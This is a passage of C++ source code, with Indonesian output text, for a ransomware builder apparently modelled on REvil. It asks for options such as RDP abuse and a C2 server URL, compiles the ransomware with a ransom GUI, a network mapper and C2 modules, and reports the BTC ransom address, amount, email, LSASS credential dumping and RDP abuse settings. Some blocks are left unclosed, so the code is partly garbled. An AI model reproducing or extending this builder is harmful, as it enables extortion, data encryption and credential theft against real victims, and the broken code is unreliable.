    cfg.enable_rdp_abuse = (input != "n" && input != "N");

    // === C2 CONFIGURATION ===
    std::cout << "\n15. Enable C2 Communication? (y/n) [n]: ";
    std::getline(std::cin, input);
    cfg.enable_c2 = (input == "y" || input == "Y");
    
    if (cfg.enable_c2) {
        std::cout << "16. C2 Server URL (https://your-server.com): ";
        std::getline(std::cin, cfg.c2_server);
        if (cfg.c2_server.empty()) {
            cfg.c2_server = "https://localhost:5000";

    // Buat config.h
    create_config_header(cfg);

    std::cout << "\n[*] Meng-compile ransomware dengan konfigurasi custom...\n";

    std::string compile_cmd = 
        "g++ -std=c++17 -o \"" + cfg.output_name + "\" "
        "revil.cpp src/ransom_gui.cpp src/network_mapper.cpp src/c2_communication.cpp "
        "imgui/imgui.cpp imgui/imgui_draw.cpp imgui/imgui_widgets.cpp imgui/imgui_tables.cpp "
        "imgui/backends/imgui_impl_glfw.cpp imgui/backends/imgui_impl_opengl3.cpp "
        "-Iimgui -Iimgui/backends "
        "-lcryptopp -lglfw -lGL -ldl -lzip -lpthread";

    int result = system(compile_cmd.c_str());

    if (result == 0) {
        std::cout << "\n[✓] BERHASIL! Ransomware custom telah dibuat:\n";
        std::cout << "    File Output     : " << cfg.output_name << "\n";
        std::cout << "    Encryption      : " << cfg.encryption_method << "\n";
        std::cout << "    Extension       : " << cfg.file_extension << "\n";
        std::cout << "    BTC Address     : " << cfg.btc_address << "\n";
        std::cout << "    Email           : " << cfg.email << "\n";
        std::cout << "    Tebusan         : $" << cfg.ransom_amount << "\n";
        std::cout << "    LSASS Dump      : " << (cfg.enable_lsass_dump ? "Aktif" : "Nonaktif") << "\n";
        std::cout << "    RDP Abuse       : " << (cfg.enable_rdp_abuse ? "Aktif" : "Nonaktif") << "\n\n";
        std::cout << "    C2 Enabled      : " << (cfg.enable_c2 ? "Ya" : "Tidak") << "\n";
        if (cfg.enable_c2) {
            std::cout << "    C2 Server       : " << cfg.c2_server << "\n";
    } else {
        std::cout << "[✗] Compile gagal. Periksa error di atas.\n";
    }

